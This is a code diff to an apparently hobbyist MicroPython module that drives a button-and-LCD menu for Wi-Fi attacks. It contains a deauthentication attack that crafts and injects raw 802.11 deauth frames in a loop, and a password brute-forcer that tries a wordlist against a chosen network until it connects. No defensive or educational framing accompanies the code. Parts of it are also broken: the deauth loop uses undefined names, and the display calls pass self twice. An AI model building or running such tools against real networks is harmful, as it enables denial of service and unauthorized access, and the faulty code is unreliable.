@@ -4,6 +4,7 @@ from I2C_LCD import I2CLcd
 import network
 import usocket
 import micropython
+from settings import settings_module
 
 
 class wifi_module(object):
@@ -16,63 +17,79 @@ class wifi_module(object):
 		self.button_down = Pin(18, Pin.IN, Pin.PULL_UP)
 	
 	def __start__(self):
+		menu=0
 		self.button_up = Pin(20, Pin.IN, Pin.PULL_UP)	 
 		self.button_ok = Pin(19, Pin.IN, Pin.PULL_UP)	
 		self.button_down = Pin(18, Pin.IN, Pin.PULL_UP)
-		menu=0
-		self.display("WIFI", 0, True)
+		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
+		devices = i2c.scan()
+		self.lcd = I2CLcd(i2c, 0x3f, 2, 16)
+		self.lcd.clear()
+		
+		self.display(self,"WIFI", 0, True)
 		self.updatemenu(self, menu)
+		
 		while True:
 			if not self.button_up.value() and not menu==0:
-				menu-1
+				menu=menu-1
 				self.updatemenu(self, menu)
-			if not self.button_down.value():
-				menu+1
+				while not self.button_up.value():
+					time.sleep(0)
+			if not self.button_down.value() and not menu==2:
+				menu=menu+1
 				self.updatemenu(self, menu)
-			if not self.button_ok.value() and not menu==0:
+				while not self.button_down.value():
+					time.sleep(0)
+			if not self.button_ok.value():
 				self.selectoption(self, menu)
+				while not self.button_ok.value():
+					time.sleep(0)
 		return
 	
 	def updatemenu(self, menu):
-		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
-		devices = i2c.scan()
-		lcd = I2CLcd(i2c, 0x3f, 2, 16)
-		lcd.clear()
-		
-		self.display("WIFI", 0, True)
+		if menu == -1:
+			menu = 0
 		if menu == 0:
-			menu = 1
+			self.display(self," > Kill wifi    ", 1)
 		if menu == 1:
-			self.display(" > Kill wifi    ", 1)
+			self.display(self," > Find wifi pwd", 1)
 		if menu == 2:
-			self.display(" > Find wifi pwd", 1)
+			self.display(self," > other        ", 1)
 		if menu == 3:
-			self.display(" > other        ", 1)
-		if menu == 4:
-			menu = 3
+			menu = 4
 	
 	def selectoption(self, menu):
-		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
-		devices = i2c.scan()
-		lcd = I2CLcd(i2c, 0x3f, 2, 16)
-		if menu == 1:
-			lcd.clear()
-			self.display("Deauth", 0, True)
-			self.display("press ok to stop", 1)
+		if menu == 0:
+			self.lcd.clear()
+			self.display(self,"Deauth", 0, True)
+			self.display(self,"press ok to stop", 1)
 			while True:
+				_ap
+				_client
+				type
+				reason=""
+				sta_if=network.WLAN(network.STA_IF)
+				packet=bytearray([0xC0,0x00,0x00,0x00,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0x00, 0x00,0x01, 0x00])
+				for i in range(0,6):
+					packet[4 + i] =_client[i]
+					packet[10 + i] = packet[16 + i] =_ap[i]
+				packet[0] = type;
+				packet[24] = reason
+				result=sta_if.freedom(packet)
+				if result==0:
+					time.sleep(0.01)
 				if not self.button_ok.value():
-					print("finished deauth")
 					break
-		if menu == 2:
-			lcd.clear()
-			self.display("Find wifi pwd", 0, True)
+		if menu == 1:
+			self.lcd.clear()
+			self.display(self,"Find wifi pwd", 0, True)
 			a=0
 			totaltry="500"
 			
 			
 			sta_if = network.WLAN(network.STA_IF)
-			ap_if.disconnect()
-			ap_if.active(False)
+			#ap_if.disconnect()
+			#ap_if.active(False)
 			sta_if.active(True)
 			
 			
@@ -90,80 +107,76 @@ class wifi_module(object):
 			
 			selectedSSID=""
 			if len(networks_list) > 0:
-				self.display("  Select  WIFI  >"+networks_list[0][0:15], 0)
+				self.display(self,"  Select  WIFI  >"+networks_list[0][0:15], 0)
 				menu3=1
 				while True:
-					if not button_down.value() and not menu3==len(networks_list):
+					if not self.button_down.value() and not menu3==len(networks_list):
 						menu3=menu3+1
-						self.display("  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
-					if not button_up.value() and not menu3==1:
+						self.display(self,"  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
+					if not self.button_up.value() and not menu3==1:
 						menu3=menu3-1
-						self.display("  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
+						self.display(self,"  Select  WIFI   > "+networks_list[menu3-1][0:15], 0)
 					if not self.button_ok.value():
 						selectedSSID=networks_list[menu3-1]
 						break
 				print("Selected SSID: "+selectedSSID)
 			else:
-				self.display("No wifi avaiable", 0)
-			sleep(1)
+				self.display(self,"No wifi avaiable", 0)
+				time.sleep(1)
 			
 			
 			
 			password="error"
 			
-			with open(getSetting("password_list"), "r") as fp:
+			with open(settings_module.getSetting("password_list"), "r") as fp:
 				password=fp.read().split("\r\n")
 			totaltry=len(password)
 			sta_if.disconnect()
-			sleep(2)
+			time.sleep(2)
 			for a in range(len(password)):
 				print(str(a)+"/"+str(len(password)))
 				
-				self.display("                ", 1)
+				self.display(self,"                ", 1)
 				lenghta=16-len("["+str(a)+"/"+str(totaltry)+"] ")
-				self.display("["+str(a)+"/"+str(totaltry)+"] "+password[a][0:lenghta], 1)
+				self.display(self,"["+str(a)+"/"+str(totaltry)+"] "+password[a][0:lenghta], 1)
 				
 				try:
 					if sta_if.isconnected():
 						sta_if.disconnect()
 						print("Already connected to network")
-						sleep(2)
+						time.sleep(2)
 						
 					
 					sta_if.connect(selectedSSID, password[a])
-					sleep(3)
+					time.sleep(3)
 					if sta_if.isconnected() and not sta_if.status() == 1:
-						self.display("                ", 1)
-						self.display("pwd: "+password[a], 1)
+						self.display(self,"                ", 1)
+						self.display(self,"pwd: "+password[a], 1)
 						while True:
 							if not self.button_ok.value():
 								break
 						break
 					print("status: "+str(sta_if.status()))
 				except Exception as e:
-					self.display("Can't reach wifi", 1)
+					self.display(self,"Can't reach wifi", 1)
 					print(e)
 					break
 				if not self.button_ok.value():
 					break
 			
-			ap_if.active(True)
+			#ap_if.active(True)
 			sta_if.active(False)
-			AP_Setup(ssidAP,passwordAP)
 			return
-		if menu == 3:
-			lcd.clear()
-			self.display("uwu2 ", 0)
-			self.display("uwu2 ", 1)
+		if menu == 2:
+			self.lcd.clear()
+			self.display(self,"uwu2 ", 0)
+			self.display(self,"uwu2 ", 1)
 			
-	def display(text, line, middle=False, lastdisplay=lastdisplay2):
-		i2c = I2C(0, sda=Pin(16), scl=Pin(17), freq=400000)
-		devices = i2c.scan()
-		lcd = I2CLcd(i2c, 0x3f, 2, 16)
+	def display(self, text, line, middle=False, lastdisplay=lastdisplay2):
 		if middle:
-			lcd.move_to(int(8-len(text)/2), line)
+			self.lcd.move_to(int(8-len(text)/2), line)
 		else:
-			lcd.move_to(0, line)
+			self.lcd.move_to(0, line)
 		if text!=lastdisplay:
-			lcd.putstr(text)
+			self.lcd.putstr(text)
 		lastdisplay=text
